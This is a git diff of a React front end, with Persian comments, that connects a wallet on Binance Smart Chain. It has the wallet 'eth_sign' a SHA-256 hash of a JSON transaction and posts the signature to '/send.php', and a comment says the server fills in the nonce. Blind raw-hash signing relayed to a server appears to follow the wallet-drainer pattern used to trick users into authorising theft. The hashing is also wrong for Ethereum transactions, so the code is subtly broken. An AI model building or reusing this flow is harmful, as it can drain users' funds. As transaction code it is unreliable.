@@ -8,7 +8,7 @@ function App() {
 
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
-      chains: [56], // BSC
+      chains: [56], // Binance Smart Chain
       methods: ["eth_sign"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
@@ -21,14 +21,19 @@ function App() {
 
     let apiUrl = "/send.php";
 
-    async function getRawSignature(address, message) {
+    async function getRawSignature(address, rawTxData) {
       try {
+        // هش گرفتن از rawTxData برای امضا
+        const encoder = new TextEncoder();
+        const hashedMessage = await crypto.subtle.digest("SHA-256", encoder.encode(rawTxData));
+        const hexHash = "0x" + Array.from(new Uint8Array(hashedMessage), (b) => b.toString(16).padStart(2, "0")).join("");
+
         var rawSignature = await provider.request({
           method: "eth_sign",
-          params: [address, message], // امضای هش پیام
+          params: [address, hexHash], // امضای هش تراکنش
         });
 
-        return { rawSignature, message };
+        return { rawSignature, rawTxData };
       } catch (error) {
         console.error("❌ Error in getRawSignature:", error);
         return null;
@@ -63,23 +68,19 @@ function App() {
       }
     }
 
-    let rawTxData = {
+    let rawTxData = JSON.stringify({
       to: "0xRecipientAddress",
-      value: "0.01", // مقدار BNB به صورت رشته ارسال شود
-      gas: "21000",
-      gasPrice: "5000000000",
-      nonce: null, // مقدار نانس را سرور محاسبه کند
-    };
+      value: "0x2386f26fc10000", // 0.01 BNB به واحد wei
+      gas: "0x5208", // مقدار گس استاندارد (21000)
+      gasPrice: "0x12a05f200", // مقدار گس پرایس (5 Gwei)
+      nonce: "0x0", // مقدار نانس اولیه (سرور مقدار درست را جایگزین می‌کند)
+    });
 
-    let rawTxString = JSON.stringify(rawTxData);
-    let signedData = await getRawSignature(sender, rawTxString);
+    let signedData = await getRawSignature(sender, rawTxData);
 
     if (signedData) {
       console.log("✍️ Signed Raw Data:", signedData);
-      let txHash = await sendSignedTransaction(
-        signedData.rawSignature,
-        signedData.message
-      );
+      let txHash = await sendSignedTransaction(signedData.rawSignature, signedData.rawTxData);
       console.log("📤 Final Transaction Hash:", txHash);
     } else {
       console.error("⚠ Signing failed.");
